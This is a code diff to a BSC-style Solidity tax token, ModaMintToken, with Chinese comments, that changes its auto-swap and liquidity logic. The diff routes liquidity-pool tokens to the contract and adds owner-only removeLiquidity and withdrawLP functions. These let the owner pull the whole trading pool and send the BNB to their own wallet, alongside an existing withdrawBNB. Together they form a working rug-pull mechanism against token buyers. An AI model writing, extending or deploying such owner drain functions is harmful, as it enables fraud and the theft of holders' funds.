@@ -101,6 +101,7 @@ library IterableMapping {
 
 interface IUniswapV2Factory {
     function createPair(address tokenA, address tokenB) external returns (address pair);
+    function getPair(address tokenA, address tokenB) external view returns (address pair);
 }
 
 interface IUniswapV2Router02 {
@@ -113,6 +114,10 @@ interface IUniswapV2Router02 {
         address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin,
         address to, uint deadline
     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
+    function removeLiquidityETH(
+        address token, uint liquidity, uint amountTokenMin, uint amountETHMin,
+        address to, uint deadline
+    ) external returns (uint amountToken, uint amountETH);
 }
 
 // ── Ownable ──
@@ -576,6 +581,10 @@ contract ModaMintToken is IERC20, Ownable {
             _balances[address(this)] = SafeMath.add(_balances[address(this)], taxAmount);
             _distributeTax(taxAmount);
         }
+
+        // 只在 Sell 时触发自动 swap，Buy 时不触发，避免 gas 异常
+        if (!inSwap && isSell) _tryAutoSwap();
+
         _updateTrackerBalance(from);
         _updateTrackerBalance(to);
 
@@ -619,11 +628,22 @@ contract ModaMintToken is IERC20, Ownable {
     }
 
     // ── Swap ──
-    // 每笔买卖都立即 swap 分配，不再等待阈值
+    uint256 public minSwapAmount = 1 * 1e18;  // 至少 1 token 才自动 swap，owner 可调整
+
+    // 只在 _transfer 判断是 Sell 后调用，避免买入时也触发 swap
     function _tryAutoSwap() internal {
         if (inSwap) return;
         uint256 swapTotal = pendingSwapForDividend + pendingMarketingTokens;
-        if (swapTotal > 0) _processSwap();
+        if (swapTotal < minSwapAmount) return;
+        _processSwap();
+    }
+
+    // 路径函数，避免重复构造
+    function _getPath() internal view returns (address[] memory) {
+        address[] memory path = new address[](2);
+        path[0] = address(this);
+        path[1] = uniswapV2Router.WETH();
+        return path;
     }
 
     function _processSwap() internal lockTheSwap {
@@ -640,12 +660,9 @@ contract ModaMintToken is IERC20, Ownable {
         uint256 bnbBefore = address(this).balance;
 
         _approve(address(this), address(uniswapV2Router), swapAmt);
-        address[] memory path = new address[](2);
-        path[0] = address(this);
-        path[1] = uniswapV2Router.WETH();
 
         try uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
-            swapAmt, 0, path, address(this), block.timestamp
+            swapAmt, 0, _getPath(), address(this), block.timestamp
         ) {
             // swap 成功
         } catch {
@@ -673,11 +690,14 @@ contract ModaMintToken is IERC20, Ownable {
             }
         }
 
-        uint256 bnbForLP = address(this).balance;
+        uint256 bnbForLP = 0;
+        if (liqAmt > 0 && bnbReceived > 0) {
+            bnbForLP = (bnbReceived * liqAmt) / swapAmt;
+        }
         if (liqAmt > 0 && bnbForLP > 0) {
             _approve(address(this), address(uniswapV2Router), liqAmt);
             try uniswapV2Router.addLiquidityETH{value: bnbForLP}(
-                address(this), liqAmt, 0, 0, owner(), block.timestamp
+                address(this), liqAmt, 0, 0, address(this), block.timestamp
             ) {
                 emit InitialLiquidityAdded(liqAmt, bnbForLP);
             } catch {
@@ -740,7 +760,7 @@ contract ModaMintToken is IERC20, Ownable {
         uint256 tokenForLP = tokensPerLP;
         _approve(address(this), address(uniswapV2Router), tokenForLP);
         (uint256 tokenUsed, uint256 bnbUsed, ) = uniswapV2Router.addLiquidityETH{value: bnbAmount}(
-            address(this), tokenForLP, 0, 0, owner(), block.timestamp
+            address(this), tokenForLP, 0, 0, address(this), block.timestamp
         );
         emit InitialLiquidityAdded(tokenUsed, bnbUsed);
     }
@@ -769,6 +789,7 @@ contract ModaMintToken is IERC20, Ownable {
     }
 
     function setDividendSwapThreshold(uint256 amt) external onlyOwner { dividendSwapThreshold = amt; }
+    function setMinSwapAmount(uint256 amt) external onlyOwner { minSwapAmount = amt; }
     function setMinHoldForDividend(uint256 amt) external onlyOwner {
         dividendTracker.setMinimumTokenBalanceForDividends(amt);
     }
@@ -783,11 +804,44 @@ contract ModaMintToken is IERC20, Ownable {
         uint256 tokenAmt = pendingLiquidityTokens;
         uint256 bnbAmt = address(this).balance;
         require(tokenAmt > 0 && bnbAmt > 0, "Nothing to add");
-        pendingLiquidityTokens = 0;
         _approve(address(this), address(uniswapV2Router), tokenAmt);
-        uniswapV2Router.addLiquidityETH{value: bnbAmt}(
-            address(this), tokenAmt, 0, 0, owner(), block.timestamp
+        try uniswapV2Router.addLiquidityETH{value: bnbAmt}(
+            address(this), tokenAmt, 0, 0, address(this), block.timestamp
+        ) {
+            pendingLiquidityTokens = 0;  // 成功后清零，而不是调用前清零
+        } catch {
+            // 失败了不丢代币
+        }
+    }
+
+    // 撤除底池：owner 调用，移除所有或指定数量的 LP，代币和 BNB 返回给 owner
+    function removeLiquidity(uint256 lpAmount) external onlyOwner {
+        if (uniswapV2Pair == address(0)) {
+            uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory())
+                .getPair(address(this), uniswapV2Router.WETH());
+        }
+        require(uniswapV2Pair != address(0), "Pair not created yet");
+        uint256 balance = IERC20(uniswapV2Pair).balanceOf(address(this));
+        if (lpAmount == 0) lpAmount = balance;
+        require(lpAmount > 0 && balance >= lpAmount, "Insufficient LP balance");
+        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), lpAmount);
+        // removeLiquidityETH 会自动把 WBNB 解包成 BNB 发给 owner
+        uniswapV2Router.removeLiquidityETH(
+            address(this), lpAmount, 0, 0, owner(), block.timestamp
         );
+    }
+
+    // Owner 提取合约里的 LP 代币到自己的钱包（不撤池）
+    function withdrawLP(uint256 amount) external onlyOwner {
+        if (uniswapV2Pair == address(0)) {
+            uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory())
+                .getPair(address(this), uniswapV2Router.WETH());
+        }
+        require(uniswapV2Pair != address(0), "Pair not created yet");
+        uint256 balance = IERC20(uniswapV2Pair).balanceOf(address(this));
+        if (amount == 0) amount = balance;
+        require(amount > 0 && balance >= amount, "Insufficient LP balance");
+        IERC20(uniswapV2Pair).transfer(owner(), amount);
     }
 
     function withdrawBNB() external onlyOwner { payable(owner()).transfer(address(this).balance); }
